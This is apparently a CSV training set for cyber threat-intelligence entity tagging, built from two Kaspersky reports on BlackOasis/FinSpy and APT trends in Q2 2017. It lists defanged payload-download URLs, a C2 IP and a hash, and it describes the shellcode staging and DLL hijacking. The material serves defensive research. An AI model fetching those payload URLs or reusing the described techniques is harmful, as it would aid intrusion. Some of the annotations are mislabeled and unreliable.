DocName,text,intent
BlackOasis,flash,software
BlackOasis,"

files:

NOP sled composed of 0x90 and 0x91 opcodes

The main purpose of the initial shellcode is to download second stage

shellcode from ",O
BlackOasis,hxxp://89.45.67[.]107/rss/5uzosoff0u.iaf,ioc
BlackOasis,".

https://cdn.securelist.com/files/2017/10/171016-blackoasis-6.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-7.png


Second stage shellcode

The second stage shellcode will then perform the following actions:

1. Download the final payload (",O
BlackOasis,FINSPY,malware
BlackOasis,") from

",O
BlackOasis,hxxp://89.45.67[.]107/rss/mo.exe,ioc
BlackOasis,"

2. Download a lure document to display to the victim from the same IP

3. Execute the payload and display the lure document

Payload – mo.exe

As mentioned earlier, the “",O
BlackOasis,mo.exe,ioc
BlackOasis,"” payload (MD5:

",O
BlackOasis,4a49135d2ecc07085a8b7c5925a36c0a,ioc
BlackOasis,) is the newest version of ,O
BlackOasis,Gamma International,threat_actor
BlackOasis,’s ,O
BlackOasis,FinSpy,malware
BlackOasis," malware, typically sold to nation states and other

law enforcement agencies to use in lawful surveillance operations.  This

newer variant has made it especially difficult for researchers to analyze

the malware due to many added anti-analysis techniques, to include a

custom packer and virtual machine to execute code.

The PCODE of the virtual machine is packed with the aplib packer.

Part of packed VM PCODE

After unpacking, the PCODE it will look like the following:

https://cdn.securelist.com/files/2017/10/171016-blackoasis-8.png


Unpacked PCODE

After unpacking the virtual machine PCODE is then decrypted:

Decrypted VM PCODE

The custom virtual machine supports a total of 34 instructions:

Example of parsed PCODE

In this example, the “1b” instruction is responsible for executing native

code that is specified in parameter field.

Once the payload is successfully executed, it will proceed to copy files to

the following locations:

https://cdn.securelist.com/files/2017/10/171016-blackoasis-9.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-10.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-11.png


C:\ProgramData\ManagerApp\AdapterTroubleshooter.exe

C:\ProgramData\ManagerApp\15b937.cab

C:\ProgramData\ManagerApp\install.cab

C:\ProgramData\ManagerApp\msvcr90.dll

C:\ProgramData\ManagerApp\d3d9.dll

The “AdapterTroubleshooter.exe” file is a legitimate binary which is

leveraged to use the famous DLL search order hijacking technique.  The

“",O
BlackOasis,d3d9.dll,ioc
BlackOasis,"” file is malicious and is loaded into memory by the legit binary

upon execution.  Once loaded, the DLL will then inject ",O
BlackOasis,FINSPY,malware
BlackOasis," into the

Winlogon process.

Part of injected code in winlogon process

The payload calls out to three C2 servers for further control and

exfiltration of data. We have observed two of them used in the past with

other ",O
BlackOasis,FINSPY,malware
BlackOasis," payloads. Most recently one of these C2 servers was used

together with ",O
BlackOasis,CVE-2017-8759,O
BlackOasis, in the attacks reported by ,O
BlackOasis,FIREEYE,org
BlackOasis," in

",O
BlackOasis,September 2017,timestamp
BlackOasis,". These IPs and other previous samples tie closely to the

",O
BlackOasis,BlackOasis,threat_actor
BlackOasis, ,O
BlackOasis,APT,threat_actor
BlackOasis, cluster of ,O
BlackOasis,FINSPY,malware
BlackOasis," activity.

Targeting and Victims
",O
BlackOasis,BlackOasis,threat_actor
BlackOasis,"’ interests span a wide gamut of figures involved in Middle

Eastern politics and verticals disproportionately relevant to the region.

This includes prominent figures in the ",O
BlackOasis,United Nations,org
BlackOasis,", opposition

bloggers and activists, and regional news correspondents. ",O
BlackOasis,During 2016,timestamp
BlackOasis,",

we observed a heavy interest in ",O
BlackOasis,Angola,country
BlackOasis,", exemplified by lure documents

indicating targets with suspected ties to ",O
BlackOasis,oil,industry
BlackOasis,", ",O
BlackOasis,money laundering,industry
BlackOasis,", and other

illicit activities. There is also an interest in international activists and think

tanks.

Victims of ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis," have been observed in the following countries:

",O
BlackOasis,Russia,country
BlackOasis,", ",O
BlackOasis,Iraq,country
BlackOasis,", ",O
BlackOasis,Afghanistan,country
BlackOasis,", ",O
BlackOasis,Nigeria,country
BlackOasis,", ",O
BlackOasis,Libya,country
BlackOasis,", ",O
BlackOasis,Jordan,country
BlackOasis,", ",O
BlackOasis,Tunisia,country
BlackOasis,", ",O
BlackOasis,Saudi Arabia,country
BlackOasis,", ",O
BlackOasis,Iran,country
BlackOasis,",

",O
BlackOasis,Netherlands,country
BlackOasis,", ",O
BlackOasis,Bahrain,country
BlackOasis,", ",O
BlackOasis,United Kingdom,country
BlackOasis, and ,O
BlackOasis,Angola,country
BlackOasis,".

Conclusions
We estimate that the attack on ",O
BlackOasis,HackingTeam,org
BlackOasis, ,O
BlackOasis,in mid-2015,timestamp
BlackOasis," left a gap on the

market for surveillance tools, which is now being filled by other

companies. One of these is ",O
BlackOasis,Gamma International,threat_actor
BlackOasis, with their ,O
BlackOasis,FinFisher,malware
BlackOasis," suite

https://cdn.securelist.com/files/2017/10/171016-blackoasis-12.png


of tools. Although ",O
BlackOasis,Gamma International,threat_actor
BlackOasis," itself was hacked by Phineas

Fisher in ",O
BlackOasis,2014,timestamp
BlackOasis,", the breach was not as serious as it was in the case of

",O
BlackOasis,HackingTeam,org
BlackOasis,". Additionally, ",O
BlackOasis,Gamma,threat_actor
BlackOasis," had two years to recover from the

attack and pick up the pace.

We believe the number of attacks relying on ",threat_actor
BlackOasis,FinFisher,malware
BlackOasis," software, supported

by zero day exploits such as the ones described here will continue to

grow.

What does it mean for everyone and how to defend against such attacks,

including zero-day exploits?

For ",O
BlackOasis,CVE-2017-11292,O
BlackOasis," and other similar vulnerabilities, one can use the

killbit for ",O
BlackOasis,Flash,software
BlackOasis," within their organizations to disable it in any applications

that respect it.  Unfortunately, doing this system-wide is not easily done,

as ",O
BlackOasis,Flash,software
BlackOasis," objects can be loaded in applications that potentially do not

follow the killbit. Additionally, this may break any other necessary

resources that rely on ",O
BlackOasis,Flash,software
BlackOasis," and of course, it will not protect against

exploits for other third party software.

Deploying a multi-layered approach including access policies, anti-virus,

network monitoring and whitelisting can help ensure customers are

protected against threats such as this.  Users of ",O
BlackOasis,Kaspersky,org
BlackOasis," products are

protected as well against this threat by one of the following detections:

",O
BlackOasis,"

PDM:Exploit.Win32.Generic

HEUR:Exploit.SWF.Generic

HEUR:Exploit.MSOffice.Generic

More information about ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis, ,O
BlackOasis,APT,threat_actor
BlackOasis," is available to customers of

",O
BlackOasis,Kaspersky,org
BlackOasis," Intelligence Reporting Service. Contact:

intelreports@kaspersky.com

Acknowledgements
We would like to thank the ",O
BlackOasis,Adobe Product Security Incident Response Team,org
BlackOasis, (,O
BlackOasis,PSIRT,org
BlackOasis,") for working with us to identify and patch this vulnerability.

References
1. ",O
BlackOasis,Adobe,org
BlackOasis," Bulletin https://helpx.adobe.com/security/products/flash-

player/apsb17-32.html

Indicators of compromise

https://answers.microsoft.com/en-us/windows/forum/windows_8-update/flashplayer-updates/cd258a3f-cd87-4ea9-bdb6-074d06ad491e?auth=1
mailto:intelreports@kaspersky.com
https://helpx.adobe.com/security/products/flash-player/apsb17-32.html


Share post on:

THERE ARE 2 COMMENTS

",O
BlackOasis,4a49135d2ecc07085a8b7c5925a36c0a,ioc
BlackOasis,"

",O
BlackOasis,89.45.67[.]107,ioc
BlackOasis,"

",O
BlackOasis,ADOBE,org
BlackOasis,  ,O
BlackOasis,APT,threat_actor
BlackOasis,  ,O
BlackOasis,MICROSOFT WORD,software
BlackOasis,"

VULNERABILITIES AND EXPLOITS  ZERO-DAY EXPLOIT  

ZERO-DAY VULNERABILITIES

Related Posts

",O
BlackOasis,Ryan,identity
BlackOasis,"
Posted on ",O
BlackOasis,"October 16, 2017. 11:54 pm",timestamp
BlackOasis,"

Does EMET block the ",O
BlackOasis,flash,software
BlackOasis," exploit?

REPLY

",O
BlackOasis,Faron Faulk,identity
BlackOasis,"
Posted on ",O
BlackOasis,"October 17, 2017. 5:04 pm",timestamp
BlackOasis,"

fixed 

https://portal.msrc.microsoft.com/en-US/security-

guidance/advisory/ADV170018

REPLY

    

The Festive
Complexities
of SIGINT-
Capable Threat
Actors

A simple
example of a
complex
cyberattack

An
(un)documented
Word feature
abused by
attackers

https://securelist.com/all?tag=31
https://securelist.com/all?tag=538
https://securelist.com/all?tag=172
https://securelist.com/all?tag=41
https://securelist.com/all?tag=923
https://securelist.com/all?tag=54
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/?replytocom=1584794#respond
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170018
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/?replytocom=1588376#respond
https://securelist.com/the-festive-complexities-of-sigint-capable-threat-actors/82683/
https://securelist.com/a-simple-example-of-a-complex-cyberattack/82636/
https://securelist.com/an-undocumented-word-feature-abused-by-attackers/81899/",O
APT Trends report Q2 2017,APT Trends report ,O
APT Trends report Q2 2017,Q2 2017,timestamp
APT Trends report Q2 2017,"


By ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017,"

APT Trends report ",O
APT Trends report Q2 2017,Q2 2017,timestamp
APT Trends report Q2 2017,"
securelist.com/apt-trends-report-q2-2017/79332

Introduction

",O
APT Trends report Q2 2017,Since 2014,timestamp
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,Kaspersky Lab,org
APT Trends report Q2 2017,’s ,O
APT Trends report Q2 2017,Global Research and Analysis Team,org
APT Trends report Q2 2017, (,O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017,") has been
providing threat intelligence reports to a wide-range of customers worldwide, leading
to the delivery of a full and dedicated private reporting service. Prior to the new
service offering, ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017," published research online for the general public in an effort to
help combat the ever-increasing threat from nation-state and other advanced actors. 
Since we began offering a threat intelligence service, all deep technical details on
advanced campaigns are first pushed to our subscriber base. At the same time, to
remain true to our efforts to help make the internet safer, important incidents, such
as ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017, or ,O
APT Trends report Q2 2017,Petya,malware
APT Trends report Q2 2017," are covered in both private and public reports.

",O
APT Trends report Q2 2017,Kaspersky,org
APT Trends report Q2 2017,"’s Private Threat Intelligence Portal (TIP)

",O
APT Trends report Q2 2017,In Q1 of 2017,timestamp
APT Trends report Q2 2017," we published our first APT Trends report, highlighting our top research
findings over the last few months. We will continue to publish quarterly reports as a
representative snapshot of what has been offered in greater detail in our private
reports in order to highlight significant events and findings we feel most users should
be aware of.  If you would like to learn more about our intelligence reports or request
more information for a specific report, readers are encouraged to contact:
intelreports@kaspersky.com.

Russian-Speaking Actors

1/8

https://securelist.com/apt-trends-report-q2-2017/79332/
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/08/07172607/APT-report-Q2-2017-1.png
https://securelist.com/apt-trends-report-q1-2017/78169/
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/08/07172602/APT-report-Q2-2017-2.png


",O
APT Trends report Q2 2017,The second,timestamp
APT Trends report Q2 2017," quarter of 2017 has seen multiple incidents involving Russian-speaking
threat actors. Topping the list of ‘attention grabbers’ were the ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017," threat
actors.

",O
APT Trends report Q2 2017,March,timestamp
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,April,timestamp
APT Trends report Q2 2017," started off with a bang, with the discovery of three zero-day exploits
being used in-the-wild by ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017,: two of these targeted ,O
APT Trends report Q2 2017,Microsoft Office,software
APT Trends report Q2 2017,"’s
Encapsulated PostScript (EPS) and the third being a ",O
APT Trends report Q2 2017,Microsoft Windows,software
APT Trends report Q2 2017," Local Privilege
Escalation (LPE).  ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, was discovered utilizing both ,O
APT Trends report Q2 2017,CVE-2017-0262,O
APT Trends report Q2 2017," (an EPS
vulnerability) and ",O
APT Trends report Q2 2017,CVE-2017-0263,O
APT Trends report Q2 2017," (LPE) over the Easter holiday, targeting a swath of
users throughout ",O
APT Trends report Q2 2017,Europe,country
APT Trends report Q2 2017,".  Prior to this attack, ",O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017, was also discovered using ,O
APT Trends report Q2 2017,CVE-2017-0261,O
APT Trends report Q2 2017," (a different EPS vulnerability).  Neither actor appeared to deviate from
their usual payload repertoire, with ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, dropping their typical ,O
APT Trends report Q2 2017,GAMEFISH,malware
APT Trends report Q2 2017," payload
and ",O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017, utilizing what we refer to as ,O
APT Trends report Q2 2017,ICEDCOFFEE,malware
APT Trends report Q2 2017, (a.k.a. ,O
APT Trends report Q2 2017,Shirime,malware
APT Trends report Q2 2017,").  Targeting for
these attacks was also directly within the normal wheelhouse for both actors,
focusing mainly on foreign ministries, governments, and other government-affiliated
organizations.

",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017, produced additional reports on ,O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017," beyond those mentioned
above.  In ",O
APT Trends report Q2 2017,April,timestamp
APT Trends report Q2 2017,", we notified customers of two new experimental macro techniques
utilized by ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017,".  These techniques, while not particularly sophisticated, caught our
attention as they had not been seen before in-the-wild.  The first technique involved
using the built-in ‘",O
APT Trends report Q2 2017,certutil,software
APT Trends report Q2 2017,’ utility in ,O
APT Trends report Q2 2017,Microsoft Windows,software
APT Trends report Q2 2017," to extract a hardcoded payload
within a macro. The second technique involved embedding Base64-encoded payloads
within the EXIF metadata of the malicious documents.  While the targeting for this
new set of activity was again fairly standard, we discovered some noteworthy
targeting against a ",O
APT Trends report Q2 2017,French political party,org
APT Trends report Q2 2017, member prior to the ,O
APT Trends report Q2 2017,2017,timestamp
APT Trends report Q2 2017," elections.  Moving
into ",O
APT Trends report Q2 2017,May,timestamp
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,June,timestamp
APT Trends report Q2 2017,", we wrote two additional reports of interest involving these two
actors: the first was an update on the long running “",O
APT Trends report Q2 2017,Mosquito Turla,malware
APT Trends report Q2 2017,"” campaign
showing the usage of fake ",O
APT Trends report Q2 2017,Adobe Flash,software
APT Trends report Q2 2017," installers and continued targeting of foreign
Ministries. The other documented yet another update on ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017,’s unique ,O
APT Trends report Q2 2017,Delphi,software
APT Trends report Q2 2017,"
payload we call ‘",O
APT Trends report Q2 2017,Zebrocy,malware
APT Trends report Q2 2017,"’.

",O
APT Trends report Q2 2017,June,timestamp
APT Trends report Q2 2017, saw the massive outbreak of a piece of malware dubbed “,O
APT Trends report Q2 2017,ExPetr,malware
APT Trends report Q2 2017,"”.  While initial
assessments presumed that this was yet another ransomware attack à la ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017,", a
deeper assessment by ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017," places the initial intent as constituting an operation
destructive in nature.  We were also able to confidently identify the initial distribution
of the malware, as well as indicate a low confidence assessment that the attacks may
share traits with the ",O
APT Trends report Q2 2017,BlackEnergy,malware
APT Trends report Q2 2017," actors. 

2/8

https://securelist.com/schroedingers-petya/78870/


Below is a summary of report titles produced for the Eastern European region only. 
As stated above, if you would like to learn more about our threat intelligence
products or request more information on a specific report, please direct inquiries to
intelreports@kaspersky.com.

1. ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017," Dabbling in New Macro Techniques
2. ",O
APT Trends report Q2 2017,Sofacy,threat_actor
APT Trends report Q2 2017," Using Two Zero Days in Recent Targeted Attacks – early warning
3. ",O
APT Trends report Q2 2017,Turla,threat_actor
APT Trends report Q2 2017," EPS Zero Day – early warning
4. ",O
APT Trends report Q2 2017,Mosquito Turla,malware
APT Trends report Q2 2017," Targets Foreign Affairs Globally
5. Update on ",O
APT Trends report Q2 2017,Zebrocy,malware
APT Trends report Q2 2017, Activity ,O
APT Trends report Q2 2017,June 2017,timestamp
APT Trends report Q2 2017,"
6. ",O
APT Trends report Q2 2017,ExPetr,malware
APT Trends report Q2 2017," motivation and attribution – Early alert
7. ",O
APT Trends report Q2 2017,BlackBox,attack_pattern
APT Trends report Q2 2017," ATM attacks using SDC bus injection

English-Speaking Actors

English-speaking actors are always particularly fascinating due to their history of
complex tooling and campaigns. Actors like ",O
APT Trends report Q2 2017,Regin,threat_actor
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Project Sauron,threat_actor
APT Trends report Q2 2017," have proven
fascinating examples of new techniques leveraged in long-lasting, hard to catch
campaigns and as such make ideal subjects for further research. Not to be outdone,
",O
APT Trends report Q2 2017,Equation,threat_actor
APT Trends report Q2 2017, and the ,O
APT Trends report Q2 2017,Lamberts,threat_actor
APT Trends report Q2 2017," were the subjects of our most recent investigations.

Continuing our practice of conducting malware paleontology while integrating new
discoveries, we published a report on ",O
APT Trends report Q2 2017,EQUATIONVECTOR,malware
APT Trends report Q2 2017,", an ",O
APT Trends report Q2 2017,Equation,threat_actor
APT Trends report Q2 2017," backdoor first
used ",O
APT Trends report Q2 2017,as early as 2006,timestamp
APT Trends report Q2 2017,". This backdoor is a fascinating passive-active shellcode staging
implant. It’s one of the earliest noted instances of a ",O
APT Trends report Q2 2017,NObody But US,malware
APT Trends report Q2 2017, (‘,O
APT Trends report Q2 2017,NOBUS,malware
APT Trends report Q2 2017,"’)
backdoor for staging further attacks. Despite its age, the ",O
APT Trends report Q2 2017,EQUATIONVECTOR,malware
APT Trends report Q2 2017," backdoor
(identified as ‘",O
APT Trends report Q2 2017,PeddleCheap,malware
APT Trends report Q2 2017,’ in the latest ,O
APT Trends report Q2 2017,ShadowBrokers,threat_actor
APT Trends report Q2 2017," disclosures) incorporates
many advanced techniques for prolonged stealthy operations in victim networks,
allowing the ",O
APT Trends report Q2 2017,Equation,threat_actor
APT Trends report Q2 2017," operators to deliver further payloads without arousing
suspicion. The report tracks the development of these tools through subsequent
iterations year-by-year.

3/8



Our tracking of the ",O
APT Trends report Q2 2017,LAMBERTS,threat_actor
APT Trends report Q2 2017, toolkit continues with the publication of the ,O
APT Trends report Q2 2017,Gray Lambert,malware
APT Trends report Q2 2017, report in ,O
APT Trends report Q2 2017,June,timestamp
APT Trends report Q2 2017,", the most advanced ",O
APT Trends report Q2 2017,Lambert,malware
APT Trends report Q2 2017," known to date. This too is a
",O
APT Trends report Q2 2017,NOBUS,malware
APT Trends report Q2 2017," backdoor, a passive implant operating strictly in user-land. The intricate
usefulness of ",O
APT Trends report Q2 2017,Gray Lambert,malware
APT Trends report Q2 2017," lies in its ability to orchestrate multiple sniffer victims on
a network via broadcast, multicast, and unicast commands, allowing the operators to
employ surgical precision in networks with many infected machines. The sniffers
double as next-stage payload delivery mechanisms for an infected network. A notable
feature of the Lambert campaigns is the level of precision with which targets are
chosen; ",O
APT Trends report Q2 2017,Gray Lambert,malware
APT Trends report Q2 2017,’s victimology is primarily focused on strategic verticals in ,O
APT Trends report Q2 2017,ASIA,country
APT Trends report Q2 2017,"
and ",O
APT Trends report Q2 2017,Middle East,country
APT Trends report Q2 2017,". During this investigation, ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017," researchers have also discovered
two additional ",O
APT Trends report Q2 2017,Lambert,threat_actor
APT Trends report Q2 2017, families (,threat_actor
APT Trends report Q2 2017,Red Lambert,malware
APT Trends report Q2 2017, and ,O
APT Trends report Q2 2017,Brown Lambert,malware
APT Trends report Q2 2017,") currently under
investigation for Q3.  Below is a list of report titles for reference:

1. ",O
APT Trends report Q2 2017,EQUATIONVECTOR,malware
APT Trends report Q2 2017, – A Generational Breakdown of the ,O
APT Trends report Q2 2017,PeddleCheap,malware
APT Trends report Q2 2017,"
Multifunctional Backdoor

2. The ",O
APT Trends report Q2 2017,Gray Lambert,malware
APT Trends report Q2 2017, – A Leap in Sophistication to User-land ,O
APT Trends report Q2 2017,NOBUS,malware
APT Trends report Q2 2017," Passive
Implants

Korean-speaking Actors

Our researchers focusing on attacks with a Korean nexus also had a very busy
quarter, producing seven reports on the ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017, group and ,O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017," attacks.  Most
of the reports on ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017, directly involved a sub-group we refer to as ,O
APT Trends report Q2 2017,BlueNoroff,threat_actor
APT Trends report Q2 2017,". 
They are the arm that focuses mainly on financial gain, targeting banks, ATMs, and
other “money-makers”.  We revealed to customers a previously unknown piece of
malware dubbed ‘",O
APT Trends report Q2 2017,Manuscrypt,malware
APT Trends report Q2 2017,’ used by ,O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017," to target not only diplomatic targets in
",O
APT Trends report Q2 2017,South Korea,country
APT Trends report Q2 2017,", but also people using virtual currency and electronic payment sites.
Most recently, ‘",O
APT Trends report Q2 2017,Manuscrypt,malware
APT Trends report Q2 2017,"’ has become the primary backdoor used by the
",O
APT Trends report Q2 2017,BlueNoroff,threat_actor
APT Trends report Q2 2017," sub-group to target financial institutions.

",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017," also created quite a stir in the second quarter, with our analysts producing
three reports and multiple blog posts on this emerging threat.  What proved most
interesting to us, was the probable linkage to ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017," group as the source of the
attacks, as well as the origins of the malware.  ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017," researchers were able to trace
back some of its earliest usage and show that before the ‘",O
APT Trends report Q2 2017,EternalBlue,malware
APT Trends report Q2 2017,"’ exploit was
added to version 2, ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017," v1 was used in spearphishing attacks months prior. 
Here is a listing of our reports from Q2 on actors with a Korean nexus:

1. ",O
APT Trends report Q2 2017,Manuscrypt,malware
APT Trends report Q2 2017, – malware family distributed by ,O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017,"
2. ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017," actor targets carders
3. ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017,-linked ATM Malware On the Loose In ,O
APT Trends report Q2 2017,South Korea,country
APT Trends report Q2 2017,"
4. ",O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017," targets electronic currency operators
5. ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017," – major ransomware attack hitting businesses worldwide – early alert
6. ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017, possibly tied to the ,O
APT Trends report Q2 2017,Lazarus,threat_actor
APT Trends report Q2 2017, ,O
APT Trends report Q2 2017,APT Group,threat_actor
APT Trends report Q2 2017,"
7. The First ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017, ,O
APT Trends report Q2 2017,Spearphish,technique
APT Trends report Q2 2017," and Module Distribution

Middle Eastern Actors
4/8



While there wasn’t much high-end activity involving Middle Eastern actors, we did
produce two reports revolving around the use of a zero-day exploit (",O
APT Trends report Q2 2017,CVE-2017-0199,O
APT Trends report Q2 2017,"). 
The most notable involved an actor we refer to as ",O
APT Trends report Q2 2017,BlackOasis,threat_actor
APT Trends report Q2 2017," and their usage of the
exploit in-the-wild prior to its discovery.  We have previously reported on ",O
APT Trends report Q2 2017,BlackOasis,threat_actor
APT Trends report Q2 2017,"
using other zero-days in the past; ",O
APT Trends report Q2 2017,CVE-2016-4117,O
APT Trends report Q2 2017, in ,O
APT Trends report Q2 2017,May 2016,timestamp
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,CVE-2016-0984,O
APT Trends report Q2 2017, in ,O
APT Trends report Q2 2017,June 2015,timestamp
APT Trends report Q2 2017,", and ",O
APT Trends report Q2 2017,CVE-2015-5119,O
APT Trends report Q2 2017, in ,O
APT Trends report Q2 2017,June 2015,timestamp
APT Trends report Q2 2017,.  It is believed that ,O
APT Trends report Q2 2017,BlackOasis,threat_actor
APT Trends report Q2 2017," is a customer of
",O
APT Trends report Q2 2017,Gamma Group,org
APT Trends report Q2 2017, and utilizes the popular ‘lawful surveillance’ kit ,O
APT Trends report Q2 2017,FinSpy,malware
APT Trends report Q2 2017,".  Other than the
usage of the exploit, this report was significant because it also showed one of the
earliest known uses of a new version of ",O
APT Trends report Q2 2017,FinSpy,malware
APT Trends report Q2 2017,", which is still being analyzed by our
researchers.

After the discovery of ",O
APT Trends report Q2 2017,CVE-2017-0199,O
APT Trends report Q2 2017,", a plethora of threat actors also began to
leverage this exploit in their attacks.  We reported to customers on the usage of this
exploit by a well-known Middle Eastern actor dubbed ‘",O
APT Trends report Q2 2017,OilRig,threat_actor
APT Trends report Q2 2017,’.  ,O
APT Trends report Q2 2017,OilRig,threat_actor
APT Trends report Q2 2017," has actively
targeted many organizations in ",O
APT Trends report Q2 2017,Israel,country
APT Trends report Q2 2017," with the exploit via spearphishes appearing to
originate from well-known doctors within Ben Gurion University.  While their
execution was less than stellar, it highlighted the widespread usage of this exploit
shortly after its discovery.

1. ",O
APT Trends report Q2 2017,OilRig,threat_actor
APT Trends report Q2 2017, exploiting ,O
APT Trends report Q2 2017,CVE-2017-0199,O
APT Trends report Q2 2017," in new campaign
2. ",O
APT Trends report Q2 2017,BlackOasis,threat_actor
APT Trends report Q2 2017," using Ole2Link zero day exploit in the wild

Chinese-Speaking Actors

On the Chinese speaking front, we felt it necessary to produce two reports to our
customers.  While Chinese speaking actors are active on a daily basis, not much has
changed and we prefer to avoid producing reports on ‘yet another instance of APTxx’
for the sake of padding our numbers.  Instead we try to focus on new and exciting
campaigns that warrant special attention.

One of those reports detailed a new finding regarding a fileless version of the well-
known ‘",O
APT Trends report Q2 2017,HiKit,malware
APT Trends report Q2 2017,’ malware dubbed ‘,O
APT Trends report Q2 2017,Hias,malware
APT Trends report Q2 2017,’.  We have reported on ,O
APT Trends report Q2 2017,Hias,malware
APT Trends report Q2 2017," in the past, and one
of our researchers was finally able to discover the persistence mechanism used,
which also allowed us to tie the activity to an actor we call ‘",O
APT Trends report Q2 2017,CloudComputating,threat_actor
APT Trends report Q2 2017,"’.

Another report detailed a new campaign we referred to as ‘",O
APT Trends report Q2 2017,IndigoZebra,campaign
APT Trends report Q2 2017,"’.  This
campaign was targeting former Soviet Republics with a wide swath of malware
including ",O
APT Trends report Q2 2017,Meterpreter,malware
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,Poison Ivy,malware
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,xDown,malware
APT Trends report Q2 2017,", and a previously unknown malware called
‘",O
APT Trends report Q2 2017,xCaon,malware
APT Trends report Q2 2017,"’.  This campaign shares ties with other well-known Chinese-speaking actors,
but no definitive attribution has been made at this time.

1. Updated technical analysis of ",O
APT Trends report Q2 2017,Hias RAT,malware
APT Trends report Q2 2017,"
2. ",O
APT Trends report Q2 2017,IndigoZebra,campaign
APT Trends report Q2 2017, – Intelligence preparation to high-level summits in ,O
APT Trends report Q2 2017,Middle Asia,country
